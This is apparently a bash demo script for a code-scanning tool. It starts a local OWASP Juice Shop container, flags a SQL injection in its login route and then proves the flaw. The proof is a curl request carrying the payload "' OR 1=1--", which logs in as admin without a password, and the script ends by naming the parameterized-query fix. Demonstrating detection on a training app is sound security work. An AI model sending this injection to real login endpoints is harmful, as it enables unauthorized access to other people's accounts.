#!/usr/bin/env bash
# 60-second demo: the skill finds a SQL injection in OWASP Juice Shop, then proves it on a local instance.
#
#   ./examples/demo/juice-shop-demo.sh setup   # once, off camera: clone source, start Juice Shop on :3000
#   ./examples/demo/juice-shop-demo.sh run     # on camera: scan, then exploit locally (about 40 seconds)
#   ./examples/demo/juice-shop-demo.sh clean   # stop the container
#
# Only ever point this at your own local Juice Shop. It is a deliberately vulnerable training app.
set -euo pipefail

JUICE_VERSION="v20.4.0"
WORK="${DEMO_DIR:-/tmp/juice-demo}"
SKILL_DIR="$(cd "$(dirname "$0")/../.." && pwd)"
TARGET="http://localhost:3000"

say()  { printf '\n\033[1;36m# %s\033[0m\n' "$*"; sleep "${PAUSE:-1.5}"; }
show() { printf '\033[1;32m$\033[0m %s\n' "$*"; sleep 0.6; eval "$@"; }

case "${1:-run}" in
  setup)
    mkdir -p "$WORK"
    [ -d "$WORK/juice-shop" ] || git clone -q --depth 1 --branch "$JUICE_VERSION" \
      https://github.com/juice-shop/juice-shop.git "$WORK/juice-shop"
    docker rm -f juice-demo >/dev/null 2>&1 || true
    docker run -d --name juice-demo -p 127.0.0.1:3000:3000 "bkimminich/juice-shop:${JUICE_VERSION}" >/dev/null
    printf 'Waiting for Juice Shop'
    until curl -fs "$TARGET" >/dev/null; do printf '.'; sleep 2; done
    cat > "$WORK/payload.json" <<'JSON'
{"email": "' OR 1=1--", "password": "anything"}
JSON
    printf ' ready at %s\n' "$TARGET"
    ;;
  run)
    clear
    say "OWASP Juice Shop: a deliberately vulnerable shop. Is the login safe?"
    show "python3 '$SKILL_DIR/scripts/loophole_scanner.py' --target '$WORK/juice-shop' --paths routes lib server.ts --quick | grep -E 'Findings|INJ-01'"
    say "INJ-01 at routes/login.ts:34. The flagged line:"
    show "sed -n 34p '$WORK/juice-shop/routes/login.ts' | cut -c1-120"
    say "The email goes straight into the SQL string. Prove it on the local instance:"
    show "cat '$WORK/payload.json'"
    show "curl -s $TARGET/rest/user/login -H 'Content-Type: application/json' -d @'$WORK/payload.json' | grep -o '\"umail\":\"[^\"]*\"'"
    say "Logged in as admin with no password. Fix: parameterized query (replacements: [email, hash])."
    ;;
  clean)
    docker rm -f juice-demo >/dev/null 2>&1 || true
    echo "Stopped juice-demo."
    ;;
  *) echo "usage: $0 setup|run|clean" >&2; exit 2 ;;
esac
